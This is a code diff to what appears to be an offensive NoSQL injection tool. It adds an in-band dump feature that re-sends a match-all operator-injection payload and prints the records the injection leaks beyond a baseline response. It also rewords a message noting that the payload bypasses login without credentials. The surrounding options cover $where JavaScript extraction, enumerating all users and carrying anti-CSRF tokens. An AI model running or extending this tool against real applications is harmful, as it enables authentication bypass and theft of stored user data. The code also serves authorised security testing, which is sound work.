@@ -61,6 +61,7 @@ def args():
         ["--extractMax", "Max characters to extract per value (default 64)"],
         ["--extractUsers", "Enumerate ALL users, not just the first (y/n)"],
         ["--extractMethod", "Extraction backend: auto (default), regex, or where ($where this.field)"],
+        ["--dump", "In-band dump: re-send the match-all payload and show the records the injection returns (GET/search endpoints) (y)"],
         ["--noWhere", "Skip the $where JavaScript technique (y)"],
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
@@ -365,7 +366,41 @@ def _payload_repr(spec, method, vector):
     if vector == "json" and method != "GET":
         return _json.dumps(_build_json(spec))
     form = _build_form(spec)
-    return "&".join("%s=%s" % (k, v) for k, v in form.items())
+    parts = []
+    for k, v in form.items():
+        if isinstance(v, list):
+            parts.extend("%s=%s" % (k, item) for item in v)
+        else:
+            parts.append("%s=%s" % (k, v))
+    return "&".join(parts)
+
+
+def _strip_html(s):
+    s = re.sub(r"(?is)<(script|style).*?</\1>", "", s)
+    s = re.sub(r"(?s)<[^>]+>", " ", s)
+    out = []
+    for line in s.splitlines():
+        line = re.sub(r"[ \t]+", " ", line).strip()
+        if line:
+            out.append(line)
+    return out
+
+
+def dump_inband(ctx, method, base_url, vector, fields_literal, finding):
+    # In-band extraction: re-send the match-all payload and surface the rows it
+    # returns that a baseline (no-match) request does not -- the leaked data.
+    try:
+        base = _send(ctx, method, base_url, vector, {n: ("lit", _rand()) for n in fields_literal})
+        full = _send(ctx, method, base_url, vector, finding["spec"])
+    except requests.RequestException as e:
+        print("    in-band dump error: %s" % e)
+        return
+    base_lines = set(_strip_html(base.body))
+    leaked = [l for l in _strip_html(full.body) if l not in base_lines]
+    print("\n[*] In-band dump via  %s" % _payload_repr(finding["spec"], method, finding["vector"]))
+    print("    %d line(s) returned by the match-all query that the baseline did not:" % len(leaked))
+    for l in leaked:
+        print("      " + l)
 
 
 # ---------------------------------------------------------------------------
@@ -700,9 +735,9 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
 
             ab = [f for f in strong if f["label"].startswith("all-fields")]
             if ab:
-                print("\n[!] AUTHENTICATION BYPASS: every field accepts a simultaneous")
-                print("    operator injection.  Reproduce with:")
-                print("    %s" % _payload_repr(ab[0]["spec"], method, ab[0]["vector"]))
+                print("\n[!] ALL-FIELDS operator injection: on a login this authenticates with")
+                print("    no credentials; on a search/data endpoint it returns every document.")
+                print("    Reproduce: %s" % _payload_repr(ab[0]["spec"], method, ab[0]["vector"]))
             if any(f["label"].startswith("$where") for f in strong):
                 print("\n[!] $where JAVASCRIPT injection confirmed: arbitrary fields are")
                 print("    extractable via this.<field> (even fields the form never submits).")
@@ -711,6 +746,16 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             print("\n=== POSSIBLE (status-only change, may be a WAF) ===")
             for f in weak:
                 print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))
+
+    # In-band dump: re-send the match-all payload and show the returned records.
+    do_dump = False
+    if args is not None:
+        do_dump = str(getattr(args, "dump", "") or "").lower() == "y"
+    elif strong:
+        do_dump = input("\nDump in-band data (re-send match-all, show returned records)? (y/n) ").lower() == "y"
+    if do_dump and strong:
+        ab = [f for f in strong if f["label"].startswith("all-fields")] or strong
+        dump_inband(ctx, method, base_url, ab[0]["vector"], fields_literal, ab[0])
 
     _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method)
 
